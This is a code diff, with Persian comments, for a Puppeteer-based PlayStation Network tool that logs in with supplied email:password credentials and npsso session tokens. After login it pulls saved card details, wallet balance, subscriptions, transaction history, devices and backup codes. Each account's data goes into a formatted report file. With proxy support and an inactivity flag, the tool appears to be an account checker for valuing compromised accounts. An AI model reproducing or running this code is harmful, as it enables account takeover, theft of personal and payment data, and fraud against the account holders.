-      onProgress(`خطا هنگام تلاش برای کلیک روی عنصر: ${error.message}`);
-    }
 
-    // Setup second page
-    const page2 = await createConfiguredPage(
-      browser,
-      cookies,
-      npsso,
-      TARGET_URLS,
-      finalResponses,
-      PAGE_CONFIGS.SECOND.name,
-      onProgress,
-      onData,
-      proxyConfig
-    );
+        // بررسی وجود فیلد ورود پسورد و پر کردن آن
+        try {
+            const passwordInputXPath =
+                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[1]/div[2]/div/div/input";
+            const submitButtonXPath =
+                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[3]/div/button";
 
-    // Navigate to second page
-    await navigateToPage(
-      page2,
-      PAGE_CONFIGS.SECOND.url,
-      "صفحه دوم",
-      onProgress
-    );
+            onProgress("در حال بررسی وجود فیلد ورود پسورد...");
 
-    await wait(3000, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
+            // انتظار برای ظاهر شدن فیلد پسورد با timeout مناسب
+            const passwordInput = await page1
+                .waitForXPath(passwordInputXPath, {
+                    visible: true,
+                    timeout: 5000,
+                })
+                .catch(() => null);
 
-    await navigateToPage(
-      page2,
-      PAGE_CONFIGS.SECOND.url,
-      "صفحه دوم (Reload 1)",
-      onProgress
-    );
+            if (passwordInput) {
+                onProgress("فیلد ورود پسورد یافت شد؛ در حال پر کردن...");
 
-    await wait(8000, "پس از Reload", onProgress);
+                // استخراج پسورد از credentials
+                const password = credentials.includes(":")
+                    ? credentials.split(":")[1]
+                    : "";
 
-    await navigateToPage(
-      page2,
-      PAGE_CONFIGS.SECOND.url,
-      "صفحه دوم (Reload 2)",
-      onProgress
-    );
+                if (password) {
+                    // پاک کردن محتوای فیلد قبل از وارد کردن پسورد
+                    await passwordInput.click({ clickCount: 3 });
+                    await passwordInput.press("Backspace");
 
-    await wait(8000, "برای پردازش صفحه نهایی", onProgress);
+                    // وارد کردن پسورد
+                    await passwordInput.type(password, { delay: 50 });
+                    onProgress("پسورد با موفقیت وارد شد.");
 
-    onProgress("دریافت کوکی‌های نهایی از تمامی صفحات...");
-    const finalPage1Cookies = await page1.cookies();
-    const finalPage2Cookies = await page2.cookies();
+                    // انتظار برای دکمه ثبت
+                    const submitButton = await page1
+                        .waitForXPath(submitButtonXPath, {
+                            visible: true,
+                            timeout: 5000,
+                        })
+                        .catch(() => null);
 
-    onProgress(
-      `تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`
-    );
+                    if (submitButton) {
+                        onProgress("دکمه ثبت یافت شد؛ در حال کلیک...");
+                        await submitButton.click();
+                        onProgress("کلیک روی دکمه ثبت انجام شد.");
 
-    const allCookies = combineUniqueCookies(
-      finalPage1Cookies,
-      finalPage2Cookies
-    );
-    onProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`);
+                        // انتظار برای ناوبری پس از کلیک روی دکمه
+                        onProgress("در انتظار بارگذاری صفحه پس از ثبت پسورد...");
+                        await Promise.race([
+                            page1.waitForNavigation({
+                                waitUntil: "networkidle2",
+                                timeout: 10000,
+                            }),
+                            wait(5000, "برای اطمینان از بارگذاری صفحه", onProgress),
+                        ]).catch(() => {
+                            onProgress(
+                                "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
+                            );
+                        });
 
-    const creditCards = await axios.get(
-      "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
-      {
-        headers: {
-          Cookie: allCookies
-            .map((cookie) => `${cookie.name}=${cookie.value}`)
-            .join("; "),
-        },
-      }
-    );
+                        // رفرش صفحه
+                        onProgress("در حال رفرش صفحه...");
+                        await page1.reload({ waitUntil: "networkidle2" });
+                        onProgress("صفحه با موفقیت رفرش شد.");
+                    } else {
+                        onProgress("دکمه ثبت یافت نشد.");
+                    }
+                } else {
+                    onProgress("پسورد در credentials یافت نشد یا فرمت نادرست است.");
+                }
+            } else {
+                onProgress("فیلد ورود پسورد در صفحه یافت نشد؛ ادامه روند...");
+            }
+        } catch (error) {
+            onProgress(`خطا در پر کردن فیلد پسورد: ${error.message}`);
+        }
 
-    finalResponses = {
-      ...finalResponses,
-      creditCards: generatePaymentMethodsText(creditCards.data),
-    };
+        // Get cookies from first page
+        const cookies = await page1.cookies();
+        onProgress(`دریافت ${cookies.length} کوکی از صفحه اول`);
 
-    const wallets = await axios.get(
-      "https://web.np.playstation.com/api/graphql/v2/transact/wallets?tenant=PSN",
-      {
-        headers: {
-          Cookie: allCookies
-            .map((cookie) => `${cookie.name}=${cookie.value}`)
-            .join("; "),
-        },
-      }
-    );
+        // Ensure NPSSO cookie is present
+        const hasNpsso = cookies.some((cookie) => cookie.name === "npsso");
+        if (!hasNpsso) {
+            onProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی");
+            cookies.push(createNpssoCookie(npsso));
+        }
 
-    finalResponses = { ...finalResponses, wallets: wallets.data };
+        try {
+            onProgress("در حال تلاش برای کلیک روی عنصر مشخص...");
+            await page1.waitForXPath(
+                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div",
+                { timeout: 20000 }
+            );
+            const [element] = await page1.$x(
+                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div"
+            );
 
-    const transactions = await axios.get(
-      "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
-      {
-        params: {
-          limit: 500,
-          startDate: "2010-01-01T00:00:00.000-0400",
-          endDate: "2025-04-06T23:59:59.999-0400",
-          includePurged: false,
-          transactionTypes: [
-            "CREDIT",
-            "CYCLE_SUBSCRIPTION",
-            "DEBIT",
-            "DEPOSIT_CHARGE",
-            "DEPOSIT_VOUCHER",
-            "PRODUCT_PURCHASE",
-            "REFUND_PAYMENT_CHARGE",
-            "REFUND_PAYMENT_WALLET",
-            "VOUCHER_PURCHASE",
-            "WALLET_BALANCE_CONVERSION",
-          ].join(","),
-        },
-        headers: {
-          Cookie: allCookies
-            .map((cookie) => `${cookie.name}=${cookie.value}`)
-            .join("; "),
-        },
-      }
-    );
+            if (element) {
+                onProgress("عنصر یافت شد؛ کلیک...");
+                await element.click();
+                onProgress("کلیک موفقیت‌آمیز.");
 
-    const plusTitle = finalResponses.profile?.isPsPlusMember
-      ? findAndProcessPlayStationPlusItem(transactions.data.transactions)
-      : null;
+                await wait(3000, "پس از کلیک", onProgress);
 
-    finalResponses = {
-      ...finalResponses,
-      transactionNumbers: transactions.data.transactions.length,
-      trans: transactions.data.transactions
-        .filter(
-          (t) =>
-            (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
-              Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) || (t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode) && t.invoiceType !== 'WALLET_FUNDING'
-        )
-        .map((t) => {
-          const fullSkuId = t.additionalInfo.orderItems[0].skuId;
-          // استفاده از optional chaining برای جلوگیری از خطا
-          const match = fullSkuId.match(/([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/);
-          const formattedSkuId = match ? match[0] : fullSkuId; // اگر مطابقتی پیدا نشد، از کل skuId استفاده کن
+                onProgress("در انتظار ناوبری پس از کلیک اول...");
+                try {
+                    await page1
+                        .waitForNavigation({
+                            waitUntil: "networkidle2",
+                            timeout: 10000,
+                        })
+                        .catch(() => {
+                            onProgress("ناوبری رخ نداد یا قبلاً انجام شده است.");
+                        });
+                    await wait(3000, "تا پایداری صفحه جدید", onProgress);
+                    onProgress(
+                        'در حال تلاش برای یافتن و کلیک روی عنصري با XPath مشخص: //*[@id="ember138"]/div/div/div/div[1]/div'
+                    );
+                    await page1
+                        .waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', {
+                            timeout: 5000,
+                        })
+                        .catch((e) => {
+                            onProgress(
+                                `عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`
+                            );
+                        });
+                    const [secondElement] = await page1.$x(
+                        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div"
+                    );
+                    if (secondElement) {
+                        onProgress("عنصر دوم پیدا شد؛ کلیک...");
+                        await secondElement.click();
+                        onProgress("کلیک عنصر دوم موفقیت‌آمیز.");
+                        await wait(3000, "پس از کلیک عنصر دوم", onProgress);
+                    } else {
+                        onProgress("عنصر دوم پیدا نشد؛ ادامه روند...");
+                    }
+                } catch (error) {
+                    onProgress(`خطا در کلیک دوم: ${error.message}`);
+                }
+            } else {
+                onProgress("عنصر با XPath مشخص یافت نشد.");
+            }
+        } catch (error) {
+            onProgress(`خطا هنگام تلاش برای کلیک روی عنصر: ${error.message}`);
+        }
 
-          return `${t.additionalInfo.orderItems[0].productName} [${t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode ? "Gift Card" : t.additionalInfo.orderItems[0].totalPrice.formattedValue
-            }] | [ ${formattedSkuId} ] | [ ${new Date(t.transactionDetail.transactionDate).getMonth() + 1
-            }/${new Date(
-              t.transactionDetail.transactionDate
-            ).getDate()}/${new Date(
-              t.transactionDetail.transactionDate
-            ).getFullYear()} ]`;
-        })
-        .join("\n"),
-    };
+        // Setup second page
+        const page2 = await createConfiguredPage(
+            browser,
+            cookies,
+            npsso,
+            TARGET_URLS,
+            finalResponses,
+            PAGE_CONFIGS.SECOND.name,
+            onProgress,
+            onData,
+            proxyConfig
+        );
 
-    const pythonProcess = spawn("python3", ["get_devices.py", npsso]);
+        // Navigate to second page
+        await navigateToPage(
+            page2,
+            PAGE_CONFIGS.SECOND.url,
+            "صفحه دوم",
+            onProgress
+        );
 
-    let result = "";
-    let error = "";
+        await wait(3000, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
 
-    pythonProcess.stdout.on("data", (data) => {
-      result += data.toString();
-    });
+        await navigateToPage(
+            page2,
+            PAGE_CONFIGS.SECOND.url,
+            "صفحه دوم (Reload 1)",
+            onProgress
+        );
 
-    pythonProcess.stderr.on("data", (data) => {
-      error += data.toString();
-    });
+        if (finalResponses.profile?.isPsPlusMember) {
+            console.log('xxxx')
 
-    pythonProcess.on("close", async (code) => {
-      if (code !== 0) {
-        console.error("خطا در اجرای پایتون:", error);
-        onError(new Error(`خطا در اجرای پایتون: ${error}`));
-        return;
-      }
+            await page1.waitForXPath(
+                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[7]/div/button/div",
+                { timeout: 20000 }
+            );
+            const [button1] = await page1.$x(
+                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[7]/div/button/div"
+            );
 
-      try {
+            if (!button1) {
+                onProgress(`دکمه با XPath  پیدا نشد.`);
+                return false;
+            }
+
+            onProgress("عنصر یافت شد؛ کلیک...");
+            await button1.click();
+            onProgress("کلیک موفقیت‌آمیز.");
+
+            await page1.waitForXPath(
+                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]",
+                { timeout: 20000 }
+            );
+            const [button2] = await page1.$x(
+                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]"
+            );
+
+            if (!button2) {
+                onProgress(`دکمه با XPath  پیدا نشد.`);
+                return false;
+            }
+
+            onProgress("عنصر یافت شد؛ کلیک...");
+            await button2.click();
+            onProgress("کلیک موفقیت‌آمیز.");
+
+            onProgress(`دکمه پیدا شد، در حال کلیک...`);
+
+            await wait(5000, " پردازش", onProgress);
+        }
+
+        onProgress("دریافت کوکی‌های نهایی از تمامی صفحات...");
+        const finalPage1Cookies = await page1.cookies();
+        const finalPage2Cookies = await page2.cookies();
+
+        onProgress(
+            `تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`
+        );
+
+        const allCookies = combineUniqueCookies(
+            finalPage1Cookies,
+            finalPage2Cookies
+        );
+        onProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`);
+
+        const creditCards = await axios.get(
+            "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
+            {
+                headers: {
+                    Cookie: allCookies
+                        .map((cookie) => `${cookie.name}=${cookie.value}`)
+                        .join("; "),
+                },
+            }
+        );
+
         finalResponses = {
-          ...finalResponses,
-          newDevices: JSON.parse(result),
+            ...finalResponses,
+            creditCards: generatePaymentMethodsText(creditCards.data),
         };
 
-        const hasSixMonthsPassed =
-          finalResponses.newDevices.length > 0
-            ? new Date(
-              finalResponses.newDevices.reduce((latest, current) =>
-                new Date(current.activationDate) >
-                  new Date(latest.activationDate)
-                  ? current
-                  : latest
-              ).activationDate
-            ) < new Date(new Date().setMonth(new Date().getMonth() - 6))
-            : false;
+        const wallets = await axios.get(
+            "https://web.np.playstation.com/api/graphql/v2/transact/wallets?tenant=PSN",
+            {
+                headers: {
+                    Cookie: allCookies
+                        .map((cookie) => `${cookie.name}=${cookie.value}`)
+                        .join("; "),
+                },
+            }
+        );
 
-        const countryCode = finalResponses.address?.country || null
+        finalResponses = { ...finalResponses, wallets: wallets.data };
 
-        // ساخت خروجی نهایی به صورت متن
-        const output = `
+        const subscriptions = await axios.get(
+            "https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions&variables=%7B%7D&extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22417949a4ca96109f5e8c56b8e3c51db8a86ba9410966ad9d2300f6af3b51e748%22%7D%7D",
+            {
+                headers: {
+                    Cookie: allCookies
+                        .map((cookie) => `${cookie.name}=${cookie.value}`)
+                        .join("; "),
+                    'content-type': 'application/json'
+                },
+            }
+        );
+
+        finalResponses = {
+            ...finalResponses,
+            plusTitle: subscriptions.data.data.fetchSubscriptions.subscriptions[0].productName,
+            plusExpireDate: formattedExpiredDate(subscriptions.data.data.fetchSubscriptions.subscriptions[0].renewalDate)
+        }
+
+        const transactions = await axios.get(
+            "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
+            {
+                params: {
+                    limit: 500,
+                    startDate: "2010-01-01T00:00:00.000-0400",
+                    endDate: "2025-04-06T23:59:59.999-0400",
+                    includePurged: false,
+                    transactionTypes: [
+                        "CREDIT",
+                        "CYCLE_SUBSCRIPTION",
+                        "DEBIT",
+                        "DEPOSIT_CHARGE",
+                        "DEPOSIT_VOUCHER",
+                        "PRODUCT_PURCHASE",
+                        "REFUND_PAYMENT_CHARGE",
+                        "REFUND_PAYMENT_WALLET",
+                        "VOUCHER_PURCHASE",
+                        "WALLET_BALANCE_CONVERSION",
+                    ].join(","),
+                },
+                headers: {
+                    Cookie: allCookies
+                        .map((cookie) => `${cookie.name}=${cookie.value}`)
+                        .join("; "),
+                },
+            }
+        );
+
+        finalResponses = {
+            ...finalResponses,
+            transactionNumbers: transactions.data.transactions.length,
+            trans: transactions.data.transactions
+                .filter(
+                    (t) =>
+                        (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
+                            Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) || (t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode) && t.invoiceType !== 'WALLET_FUNDING'
+                )
+                .map((t) => {
+                    const fullSkuId = t.additionalInfo.orderItems[0].skuId;
+                    // استفاده از optional chaining برای جلوگیری از خطا
+                    const match = fullSkuId.match(/([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/);
+                    const formattedSkuId = match ? match[0] : fullSkuId; // اگر مطابقتی پیدا نشد، از کل skuId استفاده کن
+
+                    return `${t.additionalInfo.orderItems[0].productName} [${t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode ? "Gift Card" : t.additionalInfo.orderItems[0].totalPrice.formattedValue
+                        }] | [ ${formattedSkuId} ] | [ ${new Date(t.transactionDetail.transactionDate).getMonth() + 1
+                        }/${new Date(
+                            t.transactionDetail.transactionDate
+                        ).getDate()}/${new Date(
+                            t.transactionDetail.transactionDate
+                        ).getFullYear()} ]`;
+                })
+                .join("\n"),
+        };
+
+        const pythonProcess = spawn("python3", ["get_devices.py", npsso]);
+
+        let result = "";
+        let error = "";
+
+        pythonProcess.stdout.on("data", (data) => {
+            result += data.toString();
+        });
+
+        pythonProcess.stderr.on("data", (data) => {
+            error += data.toString();
+        });
+
+        pythonProcess.on("close", async (code) => {
+            if (code !== 0) {
+                console.error("خطا در اجرای پایتون:", error);
+                onError(new Error(`خطا در اجرای پایتون: ${error}`));
+                return;
+            }
+
+            try {
+                finalResponses = {
+                    ...finalResponses,
+                    newDevices: JSON.parse(result),
+                };
+
+                const hasSixMonthsPassed =
+                    finalResponses.newDevices.length > 0
+                        ? new Date(
+                            finalResponses.newDevices.reduce((latest, current) =>
+                                new Date(current.activationDate) >
+                                    new Date(latest.activationDate)
+                                    ? current
+                                    : latest
+                            ).activationDate
+                        ) < new Date(new Date().setMonth(new Date().getMonth() - 6))
+                        : false;
+
+                const countryCode = finalResponses.address?.country || null
+
+                // ساخت خروجی نهایی به صورت متن
+                const output = `
 ----------------------- « Account Info » -----------------------
 - Account : ${credentials}
 - Npsso : ${npsso}
 - Backup Codes :  [ ${finalResponses.backupCodes
-            ? finalResponses.backupCodes.join(" - ")
-            : "N/A"
-          } ]
+                        ? finalResponses.backupCodes.join(" - ")
+                        : "N/A"
+                    } ]
 --------------------------- « Details » --------------------------
 - Country | City | Postal Code : ${countryCode ? (countries.find((item) => item.code === countryCode)).name : "N/A"
-          } - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"
-          }
+                    } - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"
+                    }
 - Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount
-          } ${finalResponses.wallets?.currencyCode || ""}
+                    } ${finalResponses.wallets?.currencyCode || ""}
 - PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
 - Payments : ${finalResponses.creditCards || "Not Found"} 
-- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${plusTitle}` : "No!"
-          }
+- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${finalResponses.plusTitle} | ${finalResponses.plusExpireDate}` : "No!"
+                    }
 - Devices : [ ${finalResponses.newDevices
-            ? [
-              ...new Set(finalResponses.newDevices.map((d) => d.deviceType)),
-            ].join(" - ")
-            : "N/A"
-          } ]
+                        ? [
+                            ...new Set(finalResponses.newDevices.map((d) => d.deviceType)),
+                        ].join(" - ")
+                        : "N/A"
+                    } ]
 - Deactive : ${hasSixMonthsPassed === false ? "No!" : "Yes!"}
 - Transaction Numbers : ${finalResponses.transactionNumbers || "N/A"}
 --------------------------- « Games » ---------------------------
@@ -961,110 +1009,73 @@ ${finalResponses.trans || "No games found"}
 --------------------------- « Finish » ----------------------------
 `;
 
-        // ذخیره خروجی در فایل
-        try {
-          const email = credentials.split(":")[0];
-          const date = new Date().toISOString().split("T")[0];
-          const fileName = `${email}-${date}.txt`;
-          const outputDir = path.join(__dirname, "output");
-          await ensureDirectoryExists(outputDir);
-          const filePath = path.join(outputDir, fileName);
-          await fs.writeFile(filePath, output, "utf8");
+                // ذخیره خروجی در فایل
+                try {
+                    const email = credentials.split(":")[0];
+                    const date = new Date().toISOString().split("T")[0];
+                    const fileName = `${email}-${date}.txt`;
+                    const outputDir = path.join(__dirname, "output");
+                    await ensureDirectoryExists(outputDir);
+                    const filePath = path.join(outputDir, fileName);
+                    await fs.writeFile(filePath, output, "utf8");
 
-          onProgress(`خروجی در فایل ${fileName} ذخیره شد.`);
-          finalResponses.outputFilePath = filePath;
-          finalResponses.formattedOutput = output;
-        } catch (fileError) {
-          onProgress(`خطا در ذخیره فایل خروجی: ${fileError.message}`);
-        }
+                    onProgress(`خروجی در فایل ${fileName} ذخیره شد.`);
+                    finalResponses.outputFilePath = filePath;
+                    finalResponses.formattedOutput = output;
+                } catch (fileError) {
+                    onProgress(`خطا در ذخیره فایل خروجی: ${fileError.message}`);
+                }
 
-        onProgress("پردازش با موفقیت به اتمام رسید");
-        onComplete({
-          ...finalResponses,
-          formattedOutput: output,
+                onProgress("پردازش با موفقیت به اتمام رسید");
+                onComplete({
+                    ...finalResponses,
+                    formattedOutput: output,
+                });
+            } catch (e) {
+                console.error("خطا در تبدیل خروجی:", e);
+                console.log("خروجی خام:", result);
+                onError(e);
+            }
         });
-      } catch (e) {
-        console.error("خطا در تبدیل خروجی:", e);
-        console.log("خروجی خام:", result);
-        onError(e);
-      }
-    });
-  } catch (error) {
-    onProgress(`خطا رخ داده: ${error.message}`);
-    onError(error);
-  } finally {
-    if (browser) {
-      await browser.close();
-      onProgress("مرورگر بسته شد.");
+    } catch (error) {
+        onProgress(`خطا رخ داده: ${error.message}`);
+        onError(error);
+    } finally {
+        if (browser) {
+          await browser.close();
+          onProgress("مرورگر بسته شد.");
+        }
     }
-  }
 }
 
 function generatePaymentMethodsText(response) {
-  let paymentMethodsText = [];
+    let paymentMethodsText = [];
 
-  if (response.creditCards) {
-    response.creditCards.forEach((card) => {
-      if (card.common.isPaymentMethodAvailable && !card.common.banned) {
-        let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
-        paymentMethodsText.push(cardInfo);
-      }
-    });
-  }
+    if (response.creditCards) {
+        response.creditCards.forEach((card) => {
+            if (card.common.isPaymentMethodAvailable && !card.common.banned) {
+                let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
+                paymentMethodsText.push(cardInfo);
+            }
+        });
+    }
 
-  if (
-    response.payPal &&
-    response.payPal.common.isPaymentMethodAvailable &&
-    !response.payPal.common.banned
-  ) {
-    paymentMethodsText.push(`[PayPal]`);
-  }
+    if (
+        response.payPal &&
+        response.payPal.common.isPaymentMethodAvailable &&
+        !response.payPal.common.banned
+    ) {
+        paymentMethodsText.push(`[PayPal]`);
+    }
 
-  return paymentMethodsText.join(" - ");
+    return paymentMethodsText.join(" - ");
 }
 
-function findAndProcessPlayStationPlusItem(data) {
-  if (!Array.isArray(data)) {
-    return null;
-  }
-
-  for (const invoice of data) {
-    if (
-      invoice.additionalInfo &&
-      Array.isArray(invoice.additionalInfo.orderItems)
-    ) {
-      for (const orderItem of invoice.additionalInfo.orderItems) {
-        if (
-          orderItem.productName &&
-          orderItem.productName.includes("PlayStation Plus")
-        ) {
-          // استخراج عنوان
-          const title = orderItem.productName;
-
-          // استخراج عدد از عنوان (به عنوان ماه)
-          const monthMatch = title.match(/\d+/);
-          const months = monthMatch ? parseInt(monthMatch[0]) : 0;
-
-          // استخراج تاریخ تراکنش
-          const transactionDate = new Date(
-            invoice.transactionDetail.transactionDate
-          );
-
-          // اضافه کردن ماه‌ها به تاریخ
-          const resultDate = new Date(transactionDate);
-          resultDate.setMonth(resultDate.getMonth() + months);
-
-          // فرمت کردن تاریخ به صورت YYYY-MM-DD
-          const formattedDate = resultDate.toISOString().split("T")[0];
-
-          // ساخت خروجی نهایی
-          return `${title} | ${formattedDate}`;
-        }
-      }
-    }
-  }
-
-  return null;
+const formattedExpiredDate = (expiredDate) => {
+    const d = new Date(new Date(expiredDate).getTime() + 86400000); 
+    
+    
+    return `${String(d.getUTCDate()).padStart(2, '0')}/${String(d.getUTCMonth() + 1).padStart(2, '0')}/${d.getUTCFullYear()}`
 }
 
 module.exports = { runPsnApiTool };
